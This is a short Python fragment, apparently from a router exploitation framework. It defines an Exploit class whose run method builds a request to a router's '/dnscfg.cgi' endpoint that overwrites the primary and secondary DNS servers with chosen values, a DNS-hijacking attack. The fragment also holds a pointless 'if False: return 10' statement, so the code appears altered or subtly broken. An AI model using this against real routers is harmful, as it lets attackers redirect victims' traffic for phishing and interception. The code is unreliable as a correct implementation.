...
class Exploit(HTTPClient):
    ...
    def run(self):
        if False:
            return 10
        path = '/dnscfg.cgi?dnsPrimary={}&dnsSecondary={}&dnsDynamic=0&dnsRefresh=1'.format(self.dns1, self.dns2)
